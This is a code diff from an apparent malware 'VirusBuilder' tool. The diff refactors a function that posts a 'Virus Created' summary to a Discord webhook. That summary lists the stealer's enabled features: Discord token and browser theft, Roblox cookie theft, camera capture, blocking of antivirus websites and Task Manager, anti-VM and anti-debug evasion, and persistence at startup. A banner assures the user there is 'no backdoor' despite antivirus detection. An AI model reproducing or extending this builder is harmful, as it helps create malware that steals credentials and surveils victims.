@@ -92,6 +92,54 @@ try:
         except Exception as e:
             print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + e}")
 
+
+    def webhook_send(webhook):
+        try:
+            fields = [
+                {"name": f"File Name:", "value": f"""```{name_file}```""", "inline": True},
+                {"name": f"File Type:", "value": f"""```{file_type}```""", "inline": True},
+                {"name": f"System Info:", "value": f"""```{add_system}```""", "inline": True},
+                {"name": f"Discord Token:", "value": f"""```{add_discord}```""", "inline": True},
+                {"name": f"Discord Injection:", "value": f"""```{add_discordinjection}```""", "inline": True},
+                {"name": f"Browser Steal:", "value": f"""```{add_browser}```""", "inline": True},
+                {"name": f"Roblox Cookie:", "value": f"""```{add_roblox}```""", "inline": True},
+                {"name": f"Camera Capture:", "value": f"""```{add_cameracapture}```""", "inline": True},
+                {"name": f"Screenshot:", "value": f"""```{add_screenshot}```""", "inline": True},
+                {"name": f"Open UserProfil:", "value": f"""```{add_openuserprofilsettings}```""", "inline": True},
+                {"name": f"Block Key:", "value": f"""```{add_blockkey}```""", "inline": True},
+                {"name": f"Block Mouse:", "value": f"""```{add_blockmouse}```""", "inline": True},
+                {"name": f"Block Task Manager:", "value": f"""```{add_blocktaskmanager}```""", "inline": True},
+                {"name": f"Block AV Website:", "value": f"""```{add_blockwebsite}```""", "inline": True},
+                {"name": f"Shutdown:", "value": f"""```{add_shutdown}```""", "inline": True},
+                {"name": f"Spam Open Program:", "value": f"""```{add_spamopenprograms}```""", "inline": True},
+                {"name": f"Fake Error:", "value": f"""```{add_fake_error}```""", "inline": True},
+                {"name": f"Launch At Startup:", "value": f"""```{add_startup}```""", "inline": True},
+                {"name": f"Restart Every 5min:", "value": f"""```{add_restart}```""", "inline": True},
+                {"name": f"Anti VM & Debug:", "value": f"""```{add_antivmanddebug}```""", "inline": True},
+                {"name": f"Webhook:", "value": f"""{webhook}""", "inline": True},
+            ]
+
+            embed = {
+                'title': f'Virus Created:',
+                'color': color_webhook,
+                "fields": fields,
+                'footer': {
+                    "text": username_webhook,
+                    "icon_url": avatar_webhook,
+                    }
+                }
+            
+            response = requests.post(webhook, data=json.dumps({
+                'embeds': [embed],
+                'username': username_webhook,
+                'avatar_url': avatar_webhook
+                }), headers={'Content-Type': 'application/json'})
+
+            if response.status_code == 404:
+                ErrorWebhook() 
+        except:
+            ErrorWebhook()
+
     Slow(f"""{virus_banner}                                                                           
 {BEFORE + current_time_hour() + AFTER} {INFO} File detected by the antivirus, but be aware that there is no backdoor!  
 {BEFORE + current_time_hour() + AFTER} {INFO} Only your webhook will be taken into account, no other webhook will be added to your Stealer.
@@ -501,7 +549,6 @@ try:
 
     root.mainloop()
 
-    #CheckWebhook(webhook)
     width = 18
     print(f"""
     {add_system          } System Info         {add_openuserprofilsettings} Open UserProfil     {add_fake_error    } Fake Error
@@ -521,6 +568,8 @@ try:
         else:
             icon_path_cut = icon_path
         print(f"    {red}Icon Path : {white + icon_path_cut}")
+
+    webhook_send(webhook)
 
     file_python_relative = f'\\1-Output\\VirusBuilder\\{name_file}.py'
     file_python = os.path.join(tool_path, "1-Output", "VirusBuilder", f"{name_file}.py")
@@ -599,56 +648,6 @@ try:
     try:
         print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Open: {white + path_destination_relative}")
         os.startfile(path_destination)
-    except: pass
-
-    try:
-        def send_webhook(embed):
-            payload = {
-            'embeds': [embed],
-            'username': username_webhook,
-            'avatar_url': avatar_webhook
-            }
-
-            headers = {
-            'Content-Type': 'application/json'
-            }
-
-            requests.post(webhook, data=json.dumps(payload), headers=headers)
-
-        fields = [
-            {"name": f"File Name:", "value": f"""```{name_file}```""", "inline": True},
-            {"name": f"File Type:", "value": f"""```{file_type}```""", "inline": True},
-            {"name": f"System Info:", "value": f"""```{add_system}```""", "inline": True},
-            {"name": f"Discord Token:", "value": f"""```{add_discord}```""", "inline": True},
-            {"name": f"Discord Injection:", "value": f"""```{add_discordinjection}```""", "inline": True},
-            {"name": f"Browser Steal:", "value": f"""```{add_browser}```""", "inline": True},
-            {"name": f"Roblox Cookie:", "value": f"""```{add_roblox}```""", "inline": True},
-            {"name": f"Camera Capture:", "value": f"""```{add_cameracapture}```""", "inline": True},
-            {"name": f"Screenshot:", "value": f"""```{add_screenshot}```""", "inline": True},
-            {"name": f"Open UserProfil:", "value": f"""```{add_openuserprofilsettings}```""", "inline": True},
-            {"name": f"Block Key:", "value": f"""```{add_blockkey}```""", "inline": True},
-            {"name": f"Block Mouse:", "value": f"""```{add_blockmouse}```""", "inline": True},
-            {"name": f"Block Task Manager:", "value": f"""```{add_blocktaskmanager}```""", "inline": True},
-            {"name": f"Block AV Website:", "value": f"""```{add_blockwebsite}```""", "inline": True},
-            {"name": f"Shutdown:", "value": f"""```{add_shutdown}```""", "inline": True},
-            {"name": f"Spam Open Program:", "value": f"""```{add_spamopenprograms}```""", "inline": True},
-            {"name": f"Fake Error:", "value": f"""```{add_fake_error}```""", "inline": True},
-            {"name": f"Launch At Startup:", "value": f"""```{add_startup}```""", "inline": True},
-            {"name": f"Restart Every 5min:", "value": f"""```{add_restart}```""", "inline": True},
-            {"name": f"Anti VM & Debug:", "value": f"""```{add_antivmanddebug}```""", "inline": True},
-            {"name": f"Webhook:", "value": f"""{webhook}""", "inline": True},
-        ]
-
-        embed = {
-            'title': f'Virus Created:',
-            'color': color_webhook,
-            "fields": fields,
-            'footer': {
-                "text": username_webhook,
-                "icon_url": avatar_webhook,
-                }
-            }
-        send_webhook(embed)
     except: pass
 
     Continue()
